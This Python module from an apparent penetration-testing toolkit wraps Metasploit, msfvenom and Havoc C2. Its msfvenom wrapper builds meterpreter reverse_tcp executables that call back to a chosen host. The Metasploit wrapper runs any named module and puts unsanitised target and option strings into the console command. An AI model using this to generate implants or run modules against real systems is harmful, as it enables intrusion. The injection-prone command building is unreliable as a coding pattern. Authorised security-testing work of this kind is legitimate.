"""Metasploit / Havoc — C2 & Exploitation Frameworks.

All wrappers require the underlying tool to be installed and only run on
targets you own or are explicitly authorised to test.
"""

from __future__ import annotations

import re
import shutil

from ..models import ScanResult
from .base import ExternalTool


def _safe_filename(value: str, *, default: str = "payload") -> str:
    """Reduce an arbitrary string to a safe single-path-segment filename.

    Strips directory separators and traversal so a crafted or malformed
    target can never escape the intended output directory.
    """
    stem = re.sub(r"[^A-Za-z0-9._-]", "_", (value or "").strip())
    stem = stem.lstrip(".").strip("_") or default
    return stem[:64]


class Metasploit(ExternalTool):
    name = "metasploit"
    bin_name = "msfconsole"
    accepted_kinds = {"ip", "domain", "url"}

    @classmethod
    async def scan(
        cls,
        target: str,
        *,
        timeout: float = 300.0,
        module: str = "auxiliary/scanner/portscan/tcp",
        options: str = "",
        **kwargs,
    ) -> ScanResult:
        if not cls.is_installed():
            return cls._not_installed_result(target)

        bin_path = shutil.which(cls.bin_name) or "msfconsole"
        rc, stdout, stderr = await cls._run_subprocess(
            [bin_path, "-q", "-x", f"use {module}; set RHOSTS {target}; {options}; run; exit"],
            timeout=timeout,
        )

        result = ScanResult(target=target, module=f"external:{cls.name}")
        result.raw["return_code"] = rc
        result.raw["stdout"] = stdout[:50000]
        result.raw["stderr"] = stderr[:8000]

        if rc != 0 and not stdout.strip():
            result.errors.append(f"msfconsole failed (rc={rc}): {stderr[:200]}")
            return result

        for line in stdout.splitlines():
            line = line.strip()
            if any(k in line for k in ["[+]", "[*]", "RHOST", "PORT", "INFO", "VULNERABLE", "OPEN"]):
                sev = "error" if "[+]" in line else ("warn" if "VULNERABLE" in line else "found")
                result.add("metasploit", line.split("]")[0] + "]", line.split("]")[-1].strip()[:160], sev)

        return result


class MsfVenom(ExternalTool):
    name = "msfvenom"
    bin_name = "msfvenom"
    accepted_kinds = {"payload"}

    @classmethod
    async def scan(
        cls,
        target: str,
        *,
        timeout: float = 60.0,
        payload: str = "windows/x64/meterpreter/reverse_tcp",
        lhost: str = "127.0.0.1",
        lport: str = "4444",
        format: str = "exe",
        **kwargs,
    ) -> ScanResult:
        if not cls.is_installed():
            return cls._not_installed_result(target)

        # Sanitise both the filename stem and the extension so a crafted
        # `target`/`format` cannot traverse out of /tmp or break the args.
        stem = _safe_filename(target)
        ext = _safe_filename(format, default="bin")
        out_path = f"/tmp/{stem}.{ext}"

        bin_path = shutil.which(cls.bin_name) or "msfvenom"
        args = [
            bin_path,
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format,
            "-o", out_path,
        ]

        rc, stdout, stderr = await cls._run_subprocess(args, timeout=timeout)

        result = ScanResult(target=target, module=f"external:{cls.name}")
        result.raw["return_code"] = rc
        result.raw["stdout"] = stdout[:50000]
        result.raw["stderr"] = stderr[:8000]

        if rc == 0:
            result.add("msfvenom", "Payload", f"Generated {out_path}", "found")
        else:
            result.errors.append(f"msfvenom failed (rc={rc}): {stderr[:200]}")

        return result


class Havoc(ExternalTool):
    name = "havoc"
    bin_name = "havoc"
    accepted_kinds = {"c2"}

    @classmethod
    async def scan(
        cls,
        target: str,
        *,
        timeout: float = 60.0,
        **kwargs,
    ) -> ScanResult:
        if not cls.is_installed():
            return cls._not_installed_result(target)

        result = ScanResult(target=target, module=f"external:{cls.name}")
        result.add("havoc", "Note", "Havoc C2 is available at /opt/Havoc/. Run teamserver then client.", "info")
        return result